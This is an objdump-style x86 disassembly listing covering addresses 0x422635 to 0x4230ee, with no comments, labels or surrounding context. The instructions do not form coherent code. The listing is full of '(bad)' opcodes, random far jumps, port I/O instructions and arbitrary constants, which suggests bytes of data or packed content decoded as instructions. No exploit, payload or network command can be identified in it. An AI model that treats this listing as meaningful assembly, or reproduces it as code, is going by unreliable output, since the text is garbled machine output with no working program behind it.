  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	sub    BYTE PTR [esp+edx*4+0x23],cl
  422644:	pop    esp
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	cmc    
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [ebp+0x6d48fc0],dh
  422651:	jge    0x4226c4
  422653:	aaa    
  422654:	fwait
  422655:	inc    DWORD PTR [edx+0x154f99b3]
  42265b:	push   ecx
  42265c:	inc    ebx
  42265d:	sub    edi,esi
  42265f:	push   esi
  422660:	push   edx
  422661:	leave  
  422662:	inc    edx
  422663:	push   si
  422665:	mov    WORD PTR [edi+ecx*1+0x72],cs
  422669:	pop    eax
  42266a:	popa   
  42266b:	or     al,0xf9
  42266d:	inc    esp
  42266e:	(bad)
  422671:	cwde   
  422672:	iret   
  422673:	pop    eax
  422674:	and    ebp,DWORD PTR gs:[ebx]
  422677:	dec    edi
  422678:	dec    esi
  422679:	in     al,dx
  42267a:	push   edi
  42267b:	js     0x42260f
  42267d:	mov    DWORD PTR [ebp+0x6a],esi
  422680:	ins    DWORD PTR es:[edi],dx
  422681:	adc    al,0xcd
  422683:	shr    DWORD PTR [edi-0x302a4bb8],0xe8
  42268a:	aad    0xef
  42268c:	adc    edi,ebx
  42268e:	div    BYTE PTR [esp+eiz*8+0x29fb3444]
  422695:	pop    ds
  422696:	sub    DWORD PTR [esi+0x50],ecx
  422699:	leave  
  42269a:	aam    0x5c
  42269c:	mov    ebp,DWORD PTR [edx]
  42269e:	inc    edx
  42269f:	test   al,0x7e
  4226a1:	test   DWORD PTR [edi],edx
  4226a3:	push   cs
  4226a4:	and    DWORD PTR [edx],edx
  4226a6:	mov    edi,0x50128105
  4226ab:	sbb    eax,0x60084c14
  4226b0:	loopne 0x42271a
  4226b2:	adc    ebp,DWORD PTR [ebp-0x2a]
  4226b5:	clc    
  4226b6:	sub    BYTE PTR [ebp+0x53],dl
  4226b9:	(bad)  
  4226bb:	sahf   
  4226bc:	sbb    al,0x12
  4226be:	push   ds
  4226bf:	add    ebp,DWORD PTR [edi]
  4226c1:	xchg   ebx,eax
  4226c2:	jge    0x422703
  4226c4:	adc    eax,0x64d0e65c
  4226c9:	add    BYTE PTR [edx],bh
  4226cb:	sti    
  4226cc:	(bad)  
  4226ce:	sbb    DWORD PTR [ecx],eax
  4226d0:	out    0xeb,eax
  4226d2:	inc    esp
  4226d3:	add    DWORD PTR [eax],esp
  4226d5:	mov    ecx,0x46a1392d
  4226da:	jecxz  0x4226bf
  4226dc:	pop    ebx
  4226dd:	ficom  DWORD PTR [ebx+ecx*2-0x55]
  4226e1:	clc    
  4226e2:	call   0xe67784f9
  4226e7:	dec    ebp
  4226e8:	outs   dx,DWORD PTR ds:[esi]
  4226e9:	or     edi,DWORD PTR [ecx+0x57]
  4226ec:	ftst   
  4226ee:	cdq    
  4226ef:	ins    BYTE PTR es:[edi],dx
  4226f0:	jecxz  0x42274f
  4226f2:	retf   
  4226f3:	jl     0x4226d7
  4226f5:	pop    ds
  4226f6:	push   0x5a
  4226f8:	mov    eax,0xc2771397
  4226fd:	data16 add dh,BYTE PTR [edi+0x30]
  422701:	mov    ds:0x4c23ee17,al
  422706:	sbb    eax,0x91486924
  42270b:	out    0xe4,al
  42270d:	outs   dx,DWORD PTR ds:[esi]
  42270e:	fistp  DWORD PTR [ecx+0x1b]
  422711:	(bad)  
  422712:	cmp    eax,esp
  422714:	adc    al,0x49
  422716:	in     eax,dx
  422717:	adc    bl,al
  422719:	shl    BYTE PTR [edx],0x5f
  42271c:	sbb    DWORD PTR [esi],ecx
  42271e:	sbb    ch,BYTE PTR [ebp-0x137295e2]
  422724:	mov    cl,0x13
  422726:	adc    eax,0xdfa21db9
  42272b:	push   ebx
  42272c:	jle    0x4226c4
  42272e:	sub    al,bl
  422730:	mov    eax,ds:0x4d28d9e6
  422735:	jns    0x422716
  422737:	loopne 0x422757
  422739:	mov    ds,WORD PTR [esi-0x373b511a]
  42273f:	xchg   esi,eax
  422740:	mov    al,BYTE PTR [eax]
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	xchg   BYTE PTR [ebx+0x70516d11],dh
  4227c6:	add    DWORD PTR [eax],eax
  4227c8:	cmc    
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR [edi-0x3b423618],ah
  4227d1:	add    eax,0xeb645b32
  4227d6:	jb     0x4227cf
  4227d8:	mul    BYTE PTR [ecx-0x38213fcc]
  4227de:	cmp    eax,0xf7ada0b
  4227e3:	out    0x49,eax
  4227e5:	cmp    BYTE PTR [edi+0x3b17209d],ch
  4227eb:	xchg   ebx,eax
  4227ec:	mov    esi,0xc85dcfda
  4227f1:	sub    eax,0x4527bb2a
  4227f6:	push   esi
  4227f7:	inc    edi
  4227f8:	aad    0x66
  4227fa:	fcmove st,st(7)
  4227fc:	pop    eax
  4227fd:	inc    esi
  4227fe:	retf   0xe64e
  422801:	push   edi
  422802:	xchg   ch,al
  422804:	(bad)  
  422806:	ins    DWORD PTR es:[edi],dx
  422807:	sub    esi,DWORD PTR [ecx]
  422809:	(bad)  
  42280a:	dec    esp
  42280b:	scas   al,BYTE PTR es:[edi]
  42280c:	(bad)  
  42280e:	out    0x4f,eax
  422810:	bound  edi,QWORD PTR [edi-0x588ab86]
  422816:	daa    
  422817:	sbb    eax,0xdbf50d1e
  42281c:	daa    
  42281d:	or     al,0xf
  422820:	fisttp DWORD PTR [edi+0x2f2a863e]
  422826:	sahf   
  422827:	push   ebx
  422828:	jo     0x4227fd
  42282a:	dec    ebp
  42282b:	inc    esi
  42282c:	xchg   ecx,eax
  42282d:	sbb    eax,esi
  42282f:	adc    al,0xfe
  422831:	imul   esp,DWORD PTR ds:0x791f25,0xb2a315b3
  42283b:	dec    esp
  42283c:	in     eax,dx
  42283d:	(bad)  
  42283e:	(bad)  
  42283f:	(bad)  
  422840:	jae    0x42287f
  422842:	fs ins DWORD PTR es:[edi],dx
  422844:	cli    
  422845:	and    eax,0x9fc3d38a
  42284a:	xchg   ebx,eax
  42284b:	pop    ecx
  42284c:	aas    
  42284d:	mov    eax,0x14980a29
  422852:	mov    dl,0xf9
  422854:	(bad)  
  422855:	push   ecx
  422856:	mov    BYTE PTR [edi-0x7ce2460d],ah
  42285c:	out    0xe7,eax
  42285e:	dec    edx
  42285f:	jo     0x42287e
  422861:	xor    al,0xfd
  422863:	pop    ss
  422864:	(bad)  
  422865:	out    0xc1,eax
  422867:	xchg   edx,eax
  422868:	inc    ecx
  422869:	mov    eax,ds:0x2dce57c2
  42286e:	mov    dh,0xf8
  422870:	mov    esi,0x7a1ae8ad
  422875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422876:	dec    ch
  422878:	mov    WORD PTR [edi+0x4a4fccce],?
  42287e:	inc    ebx
  42287f:	cmp    esp,DWORD PTR [edx+ecx*2]
  422882:	fcmovnbe st,st(3)
  422884:	pop    edx
  422885:	add    esp,esi
  422887:	out    dx,al
  422888:	sbb    bl,BYTE PTR [eax]
  42288a:	jg     0x4228de
  42288c:	dec    eax
  42288d:	xor    eax,0x4de51730
  422892:	fnsave [ecx+0x5a]
  422895:	push   edx
  422896:	sbb    al,0x72
  422898:	outs   dx,DWORD PTR ds:[esi]
  422899:	xlat   BYTE PTR ds:[ebx]
  42289a:	sar    DWORD PTR [eax-0x44],1
  42289d:	(bad)  
  42289e:	sahf   
  42289f:	iret   
  4228a0:	push   esi
  4228a1:	cmp    BYTE PTR [eax+0x3d],ah
  4228a4:	mov    ch,0x2
  4228a6:	mov    eax,0x41cf92b4
  4228ab:	in     eax,dx
  4228ac:	inc    edi
  4228ad:	jge    0x42289e
  4228af:	mov    bl,0x8c
  4228b1:	gs mov edi,0x332e3101
  4228b7:	ret    
  4228b8:	cmp    DWORD PTR [edi+edx*1],0xffffffb9
  4228bc:	jp     0x42286e
  4228be:	enter  0x1461,0x0
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	inc    esp
  422941:	dec    edx
  422942:	pop    ss
  422943:	(bad)  
  422944:	inc    esi
  422945:	jno    0x422948
  422947:	add    ch,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    bh,cl
  42294d:	pusha  
  42294e:	test   DWORD PTR [ebx+esi*4-0x41b062f2],edx
  422955:	add    eax,DWORD PTR [ecx]
  422957:	mov    eax,ds:0xd95d4902
  42295c:	adc    ah,BYTE PTR [edi-0x63d33311]
  422962:	sub    ebp,DWORD PTR [esi-0x7b]
  422965:	dec    esp
  422966:	pop    esp
  422967:	and    DWORD PTR [bp+si],ecx
  42296a:	sbb    eax,DWORD PTR [esi-0x6]
  42296d:	ror    ah,cl
  42296f:	add    eax,0xdd96850f
  422974:	jge    0x422975
  422976:	pusha  
  422977:	in     al,0xe5
  422979:	cmp    dl,BYTE PTR [eax+edx*1]
  42297c:	or     ah,bh
  42297e:	mov    edx,DWORD PTR [esi-0x374207c0]
  422984:	outs   dx,DWORD PTR ds:[esi]
  422985:	add    eax,0xacf5ce30
  42298a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42298b:	mov    edi,0x3e9b030
  422990:	cwde   
  422991:	mov    edi,DWORD PTR [ebx]
  422993:	push   ebp
  422994:	dec    eax
  422995:	ds mov ch,0x5c
  422998:	bound  edi,QWORD PTR [eax]
  42299a:	out    0x95,al
  42299c:	scas   al,BYTE PTR es:[edi]
  42299d:	dec    esi
  42299f:	std    
  4229a0:	into   
  4229a1:	inc    edi
  4229a2:	mov    esi,0x90b1339c
  4229a7:	gs daa 
  4229a9:	retf   0x82f4
  4229ac:	dec    esp
  4229ad:	xchg   ecx,eax
  4229ae:	sahf   
  4229af:	in     al,0xe7
  4229b1:	enter  0x57c9,0xe5
  4229b5:	ret    0x260f
  4229b8:	jb     0x4229fe
  4229ba:	jp     0x422a05
  4229bc:	std    
  4229bd:	stos   DWORD PTR es:[edi],eax
  4229be:	lea    esp,[edi+esi*2]
  4229c1:	sub    eax,0xc2659d
  4229c6:	div    esp
  4229c8:	in     eax,dx
  4229c9:	int    0xc9
  4229cb:	ja     0x4229ae
  4229cd:	ror    BYTE PTR [ecx-0x54],0x36
  4229d1:	out    dx,al
  4229d2:	push   edx
  4229d3:	pop    ss
  4229d4:	jae    0x4229a9
  4229d6:	adc    DWORD PTR [edi+0x1f],ebx
  4229d9:	mov    edx,0xf711dd68
  4229de:	test   al,0xa3
  4229e0:	cs jmp 0x8d5a:0x8bc3007c
  4229e8:	and    dl,BYTE PTR [ebp+0x24]
  4229eb:	mov    ds,WORD PTR [esi+0x54]
  4229ee:	jbe    0x422a3f
  4229f0:	cld    
  4229f1:	or     al,0xda
  4229f3:	enter  0x6ad2,0x2f
  4229f7:	or     eax,0x9d9a7df1
  4229fc:	repnz jecxz 0x4229e4
  4229ff:	in     eax,dx
  422a00:	lds    ebp,FWORD PTR [ecx-0xdbae7db]
  422a06:	push   0xd6f7699c
  422a0b:	neg    DWORD PTR [ecx]
  422a0d:	neg    BYTE PTR [esi+0x448dc7bc]
  422a13:	repnz cli 
  422a15:	pop    eax
  422a16:	hlt    
  422a17:	inc    ebp
  422a18:	push   ebp
  422a19:	movq   mm1,QWORD PTR [edx-0x3b]
  422a1d:	ins    DWORD PTR es:[edi],dx
  422a1e:	jmp    0xdc73c112
  422a23:	fadd   QWORD PTR [esi+esi*4+0x692c730e]
  422a2a:	sbb    cl,BYTE PTR [eax+0x74322b83]
  422a30:	ror    al,0x6a
  422a33:	clc    
  422a34:	sub    eax,0x22fac6ce
  422a39:	imul   edx,DWORD PTR ss:[ebx+0x52],0x5c
  422a3e:	xor    dh,BYTE PTR [edi+0x1f]
	...
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	inc    edi
  422ac1:	xchg   al,dl
  422ac3:	loop   0x422b00
  422ac5:	jb     0x422ac8
  422ac7:	add    ch,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    ch,ch
  422acd:	push   eax
  422ace:	xor    eax,0x5104657e
  422ad3:	sub    BYTE PTR [esi],0x0
  422ad6:	xor    DWORD PTR [ebx],edx
  422ad8:	push   ebx
  422ad9:	add    eax,DWORD PTR [ebx-0x3b]
  422adc:	les    edi,FWORD PTR [ebx+0x1]
  422adf:	mov    ecx,0xa6a5c2d4
  422ae4:	sub    BYTE PTR [edx-0x382bc709],al
  422aea:	inc    ebp
  422aeb:	xor    al,0x2b
  422aed:	sbb    DWORD PTR [ebp+0x3],esi
  422af0:	push   ss
  422af1:	mov    dh,0x67
  422af3:	push   ss
  422af4:	cmp    al,0x97
  422af6:	call   0xed9205d9
  422afb:	test   al,0xcb
  422afd:	outs   dx,BYTE PTR ds:[esi]
  422afe:	and    BYTE PTR ds:0xd32786df,0x8b
  422b05:	sbb    edi,DWORD PTR [edx+0x308397e3]
  422b0b:	ins    BYTE PTR es:[edi],dx
  422b0c:	xor    ch,ah
  422b0e:	mov    edx,0x90cbb9a4
  422b13:	cmp    ah,BYTE PTR [edi-0x2947206]
  422b19:	idiv   DWORD PTR [ecx+0x8]
  422b1c:	mov    esp,0xa91eb802
  422b21:	xor    edi,DWORD PTR [eax]
  422b23:	cmp    al,0x6
  422b25:	adc    DWORD PTR [ebp+0x2945a7fe],ecx
  422b2b:	popa   
  422b2c:	cwde   
  422b2d:	push   ebp
  422b2e:	jp     0x422ae6
  422b30:	mov    eax,0x18668845
  422b35:	daa    
  422b36:	sbb    al,0xe2
  422b38:	push   0xe
  422b3a:	and    bh,BYTE PTR [ebp+eax*2-0xb361f1e]
  422b41:	pop    esp
  422b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b43:	not    DWORD PTR [eax]
  422b45:	rcl    DWORD PTR [ebx],cl
  422b47:	test   al,0x9
  422b49:	mov    edi,0xd37e8053
  422b4e:	stos   BYTE PTR es:[edi],al
  422b4f:	shl    BYTE PTR [ebx-0x69ed4a0b],0x3f
  422b56:	jnp    0x422b57
  422b58:	and    cl,ah
  422b5a:	pop    eax
  422b5b:	pop    ebp
  422b5c:	das    
  422b5d:	(bad)  
  422b5e:	jmp    0x7db9:0xabae2381
  422b65:	clc    
  422b66:	sub    al,0x16
  422b68:	loopne 0x422bcd
  422b6a:	jne    0x422b33
  422b6c:	(bad)  
  422b6d:	mov    edi,esp
  422b6f:	pop    es
  422b70:	inc    ebp
  422b71:	sbb    eax,0xc74f4535
  422b76:	aaa    
  422b77:	iret   
  422b78:	add    DWORD PTR [eax],esi
  422b7a:	inc    eax
  422b7b:	imul   edx,DWORD PTR [ebx+0x39],0xf
  422b7f:	stos   BYTE PTR es:[edi],al
  422b80:	push   esp
  422b81:	add    edx,DWORD PTR [edi+0x29]
  422b84:	dec    ebp
  422b85:	dec    eax
  422b86:	inc    esi
  422b87:	aaa    
  422b88:	sub    dh,BYTE PTR [edx+0x26]
  422b8b:	sub    DWORD PTR [edi+ebp*4+0x6ad1ef5c],edi
  422b92:	xchg   ebx,eax
  422b93:	jg     0x422b33
  422b95:	int    0xcd
  422b97:	xor    bl,BYTE PTR [esi-0x2b]
  422b9a:	sbb    BYTE PTR [eax-0x74],bh
  422b9d:	sbb    esp,DWORD PTR [ebx-0x7e239921]
  422ba3:	shl    DWORD PTR [edi-0x2e],1
  422ba6:	inc    BYTE PTR [eax+0x11]
  422ba9:	std    
  422baa:	(bad)  
  422bab:	jmp    FWORD PTR [eax-0x6a]
  422bae:	je     0x422c03
  422bb0:	dec    edx
  422bb1:	adc    eax,ebx
  422bb3:	lods   al,BYTE PTR ds:[esi]
  422bb4:	add    al,0xa9
  422bb6:	mov    bl,0x19
  422bb8:	leave  
  422bb9:	ins    BYTE PTR es:[edi],dx
  422bba:	push   es
  422bbb:	mov    al,ds:0x2acf69dc
  422bc0:	fild   WORD PTR [eax]
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	in     al,dx
  422c41:	mov    ah,BYTE PTR [ecx]
  422c43:	in     al,dx
  422c44:	xor    BYTE PTR [ebx+0x1],dh
  422c47:	add    ch,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebp+0x32],bh
  422c4e:	repnz mov edi,0x9610a8b
  422c54:	les    esp,FWORD PTR [ecx+esi*2-0x7769c28f]
  422c5b:	and    DWORD PTR ss:[ebx],0xffffffcd
  422c5f:	mov    eax,DWORD PTR [edi]
  422c61:	and    eax,0x1dfdce20
  422c66:	cmp    ebx,DWORD PTR [ecx+0x40ca1e40]
  422c6c:	enter  0x2235,0xe3
  422c70:	add    al,0xc7
  422c72:	sbb    al,0xec
  422c74:	in     al,dx
  422c75:	imul   ebp,DWORD PTR [esp],0x21
  422c79:	cwde   
  422c7a:	lahf   
  422c7b:	ret    0xe529
  422c7e:	scas   al,BYTE PTR es:[edi]
  422c7f:	fs jbe 0x422cbf
  422c82:	sbb    BYTE PTR [eax+0x57e719ca],0xd9
  422c89:	sub    BYTE PTR [ecx-0x5d],al
  422c8c:	inc    eax
  422c8d:	dec    esp
  422c8e:	out    dx,eax
  422c8f:	sbb    DWORD PTR [ebx-0x6a],esp
  422c92:	mov    ebx,0xfbab9eca
  422c97:	mov    ds:0xd1d22e7b,al
  422c9c:	stos   BYTE PTR es:[edi],al
  422c9d:	(bad)  
  422c9e:	adc    DWORD PTR ds:0x8e58240f,esi
  422ca4:	stc    
  422ca5:	mov    ecx,0xb8399b3f
  422caa:	jo     0x422ce3
  422cac:	mov    ecx,0x98178aaa
  422cb1:	xchg   ebp,eax
  422cb2:	sbb    eax,0x64d4d0d2
  422cb7:	jmp    0x422d05
  422cb9:	repz sub eax,0x885c69d8
  422cbf:	push   ebx
  422cc0:	lods   eax,DWORD PTR ds:[esi]
  422cc1:	mov    ?,esp
  422cc3:	stos   DWORD PTR es:[edi],eax
  422cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc5:	mov    BYTE PTR ds:[ebx],dl
  422cc8:	xchg   edi,eax
  422cc9:	in     al,0x9b
  422ccb:	pop    ebx
  422ccc:	pop    es
  422ccd:	mov    dh,0x59
  422ccf:	or     BYTE PTR [edi-0x68970033],ch
  422cd5:	inc    esp
  422cd6:	xchg   ebx,eax
  422cd7:	mov    esp,edx
  422cd9:	xchg   DWORD PTR [esi],ecx
  422cdb:	stc    
  422cdc:	(bad)  
  422cdd:	stc    
  422cde:	arpl   cx,sp
  422ce0:	adc    eax,0x51dd5658
  422ce5:	xor    al,0xad
  422ce7:	sub    al,0xd4
  422ce9:	test   al,0xb6
  422ceb:	mov    ebx,DWORD PTR [edx]
  422ced:	inc    ebp
  422cee:	jne    0x422cbc
  422cf0:	or     esi,esp
  422cf2:	mov    ecx,0x681c3d32
  422cf7:	cmp    al,0x5d
  422cf9:	mov    bh,0x22
  422cfb:	enter  0xefbb,0x2c
  422cff:	loop   0x422ca0
  422d01:	test   al,0x57
  422d03:	das    
  422d04:	idiv   DWORD PTR [ebx]
  422d06:	pop    edx
  422d07:	(bad)  
  422d08:	jne    0x422d0d
  422d0a:	sub    BYTE PTR [edi],ch
  422d0c:	(bad)  
  422d0d:	sbb    al,0xdc
  422d0f:	pop    ss
  422d10:	je     0x422d34
  422d12:	xchg   edx,eax
  422d13:	cmp    eax,0x967ed66d
  422d18:	pmaxsw mm4,QWORD PTR [ebp+0x33]
  422d1c:	cs push ds
  422d1e:	jl     0x422ce0
  422d20:	inc    esi
  422d21:	sgdtd  [eax+ebx*4]
  422d25:	cmovl  ebp,DWORD PTR [ecx-0x1b]
  422d29:	lods   al,BYTE PTR ds:[esi]
  422d2a:	leave  
  422d2b:	adc    al,al
  422d2d:	and    dl,BYTE PTR [esp+ebp*2]
  422d30:	dec    ebp
  422d31:	out    0xee,eax
  422d33:	imul   esp,DWORD PTR [esi+0x7],0x77
  422d37:	pminub mm5,QWORD PTR [esi-0x41]
  422d3b:	mov    cs:0x19c63e40,eax
	...
  422db1:	add    BYTE PTR [eax],al
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x6edbf9f7
  422dc2:	cmp    al,0x61
  422dc4:	and    eax,0xf5000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [esi+0x415ed821],dl
  422dd1:	or     BYTE PTR [eax],bh
  422dd3:	mov    cl,dl
  422dd5:	icebp  
  422dd6:	push   cs
  422dd7:	pop    eax
  422dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dd9:	mov    ch,cl
  422ddb:	push   0xffffffcf
  422ddd:	mov    edi,0x9dbb6e6e
  422de2:	jp     0x422dda
  422de4:	ret    
  422de5:	pop    esi
  422de6:	pop    ebp
  422de7:	pop    ss
  422de8:	mov    bh,0x96
  422dea:	cmp    eax,edx
  422dec:	mov    ch,0xf6
  422dee:	mov    ch,0x3e
  422df0:	rol    DWORD PTR [esi+0x2adcc4a5],0x9e
  422df7:	mov    eax,0x9cb7d7de
  422dfc:	mov    edi,0x8bd20829
  422e01:	stc    
  422e02:	push   edi
  422e03:	(bad)  [edi+0x5748dab2]
  422e09:	or     al,0xed
  422e0b:	stc    
  422e0c:	int    0x7b
  422e0e:	call   0xa570:0x50d14d48
  422e15:	ret    0xecf1
  422e18:	std    
  422e19:	xchg   edi,eax
  422e1a:	std    
  422e1b:	sub    ah,0xdf
  422e1e:	call   0x29ea:0x73317d71
  422e25:	cmp    dh,BYTE PTR [esi+edi*8+0xe687203]
  422e2c:	push   eax
  422e2d:	add    al,0x10
  422e2f:	icebp  
  422e30:	retf   
  422e31:	sub    BYTE PTR [esi],cl
  422e33:	xchg   esi,eax
  422e34:	jecxz  0x422e6b
  422e36:	stos   BYTE PTR es:[edi],al
  422e37:	arpl   WORD PTR [ebx+edi*4],bp
  422e3a:	fldln2 
  422e3c:	dec    esi
  422e3d:	jg     0x422e2b
  422e3f:	lods   eax,DWORD PTR ds:[esi]
  422e40:	push   0x4f
  422e42:	call   0xe60:0x45da
  422e48:	mov    DWORD PTR [esi+0x28e5daf4],eax
  422e4e:	xchg   esi,eax
  422e4f:	sbb    DWORD PTR [edx+0x28],esi
  422e52:	inc    edx
  422e53:	dec    esp
  422e54:	je     0x422ed4
  422e56:	icebp  
  422e57:	mov    esp,0xb8524397
  422e5c:	xor    eax,0xa066f7d8
  422e61:	idiv   esi
  422e63:	stos   BYTE PTR es:[edi],al
  422e64:	xchg   edi,eax
  422e65:	push   esi
  422e66:	sub    ah,BYTE PTR [ebp-0x7ab5c817]
  422e6c:	sbb    DWORD PTR [eax+edx*4+0x41],0x15b302c8
  422e74:	add    dh,0x96
  422e77:	aas    
  422e78:	jne    0x422ee2
  422e7a:	repnz out 0x89,al
  422e7d:	aaa    
  422e7e:	aad    0xc
  422e80:	xchg   esp,eax
  422e81:	ja     0x422efb
  422e83:	dec    ecx
  422e84:	ins    BYTE PTR es:[edi],dx
  422e85:	cmp    eax,ebx
  422e87:	fsubp  st(7),st
  422e89:	cmp    al,0x3a
  422e8b:	sbb    al,0x2a
  422e8d:	test   BYTE PTR ds:0x7e726e68,cl
  422e93:	mov    BYTE PTR [ebx],ch
  422e95:	cmp    eax,0x72d1584a
  422e9a:	inc    esp
  422e9b:	adc    eax,DWORD PTR [edx-0x31555516]
  422ea1:	dec    ecx
  422ea2:	mov    DWORD PTR [eax],esi
  422ea4:	and    eax,0xcffaef35
  422ea9:	arpl   WORD PTR es:[esi+eax*4+0x25],ax
  422eae:	popa   
  422eaf:	pop    eax
  422eb0:	sahf   
  422eb1:	sub    eax,0x70410030
  422eb6:	xor    ch,BYTE PTR [eax+0x6e]
  422eb9:	jae    0x422f00
  422ebb:	loope  0x422eee
  422ebd:	nop
  422ebe:	jg     0x422edc
  422ec0:	add    DWORD PTR [eax],0x0
	...
  422f32:	add    BYTE PTR [eax],al
  422f34:	imul   eax,DWORD PTR [esi],0xffffff8f
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	addr16 fs add ch,bl
  422f41:	push   ebx
  422f42:	ret    0x1a44
  422f45:	jne    0x422f48
  422f47:	add    ch,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    al,ch
  422f4d:	push   ss
  422f4e:	and    DWORD PTR [edi+eax*1-0x35],0x67
  422f53:	and    esp,edi
  422f55:	xor    edi,DWORD PTR [edi+0x7777f9c8]
  422f5b:	aad    0x0
  422f5d:	and    al,0x8
  422f5f:	inc    edi
  422f60:	bound  eax,QWORD PTR [edx+eiz*8]
  422f63:	push   edi
  422f64:	dec    ebp
  422f65:	push   ss
  422f66:	outs   dx,BYTE PTR ds:[si]
  422f68:	(bad)  
  422f69:	rcr    DWORD PTR [edi],cl
  422f6b:	dec    edi
  422f6c:	cmp    DWORD PTR [eax],edx
  422f6e:	inc    ebx
  422f6f:	dec    BYTE PTR [esi+0x73669862]
  422f75:	or     eax,0xfc726caa
  422f7a:	push   ds
  422f7b:	sub    BYTE PTR [eax+esi*4+0x4de9aceb],dl
  422f82:	fimul  WORD PTR [eax]
  422f84:	adc    al,0xad
  422f86:	sti    
  422f87:	pop    ds
  422f88:	int3   
  422f89:	or     bh,BYTE PTR [esi]
  422f8b:	scas   eax,DWORD PTR es:[edi]
  422f8c:	pop    esp
  422f8d:	cwde   
  422f8e:	vpcmpgtw xmm6,xmm1,xmm3
  422f92:	and    DWORD PTR [eax-0xc],0x191b087a
  422f99:	mul    DWORD PTR [ebx]
  422f9b:	sub    DWORD PTR [esp+edx*4],0xc9a50f9f
  422fa2:	push   0x63be9c0a
  422fa7:	div    BYTE PTR [edi-0x33fc2065]
  422fad:	fld    TBYTE PTR [edi]
  422faf:	push   cs
  422fb0:	arpl   bx,bp
  422fb2:	popa   
  422fb3:	loope  0x422f86
  422fb5:	lock jo 0x422f91
  422fb8:	pop    ecx
  422fb9:	inc    esi
  422fba:	xlat   BYTE PTR ds:[ebx]
  422fbb:	and    eax,0xde66c12e
  422fc0:	out    dx,eax
  422fc1:	mov    bl,0x4b
  422fc3:	add    DWORD PTR [ebx+0x43adb178],edi
  422fc9:	add    dh,ch
  422fcb:	stc    
  422fcc:	call   DWORD PTR [edi+0xa]
  422fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fd0:	cmp    al,0xaf
  422fd2:	xor    al,0x30
  422fd4:	(bad)  
  422fd5:	fwait
  422fd6:	inc    ebx
  422fd7:	and    eax,0xad93d36b
  422fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fdd:	loope  0x422f61
  422fdf:	ret    0x161f
  422fe2:	mov    esp,0x582a8c1
  422fe7:	adc    eax,0xcf55c92c
  422fec:	mov    edi,0x5353dd34
  422ff1:	iret   
  422ff2:	and    ch,BYTE PTR [ecx]
  422ff4:	push   es
  422ff5:	inc    ebx
  422ff6:	sub    DWORD PTR [edi],edi
  422ff8:	xchg   edi,eax
  422ff9:	std    
  422ffa:	cmp    al,ch
  422ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ffd:	les    esi,FWORD PTR [ecx+0x4cceab4b]
  423003:	cli    
  423004:	push   eax
  423005:	ja     0x423072
  423007:	repz out dx,al
  423009:	in     eax,dx
  42300a:	xor    dl,BYTE PTR [ecx-0x6172b09a]
  423010:	xchg   ebp,eax
  423011:	shr    bh,cl
  423013:	vmulss xmm1,xmm7,xmm7
  423017:	push   cs
  423018:	jge    0x422fba
  42301a:	pushf  
  42301b:	repz fisttp WORD PTR [ebx]
  42301e:	jmp    0x7350d509
  423023:	das    
  423024:	add    bh,BYTE PTR [edx+0x704f99b6]
  42302a:	int    0x5f
  42302c:	ja     0x423030
  42302e:	adc    ebx,DWORD PTR [ebx-0x67f6162b]
  423034:	adc    eax,0xf9b39021
  423039:	ret    
  42303a:	dec    edi
  42303b:	pop    es
  42303c:	out    0xcf,eax
  42303e:	or     eax,0xa186
	...
  4230b3:	add    BYTE PTR [esi-0x284ae],ah
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	ja     0x4230cc
  4230c2:	mov    eax,ds:0x1760f4f
  4230c7:	add    ch,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [edx+0x1625aadc],bl
  4230d1:	mov    eax,0x947a73da
  4230d6:	sub    eax,0x2ec14026
  4230db:	iret   
  4230dc:	out    dx,al
  4230dd:	stos   DWORD PTR es:[edi],eax
  4230de:	jmp    0x639f0d01
  4230e3:	ins    WORD PTR es:[edi],dx
  4230e5:	aad    0xb1
  4230e7:	test   BYTE PTR [ecx+0x72e36a33],0xa7
  4230ee:	hlt    
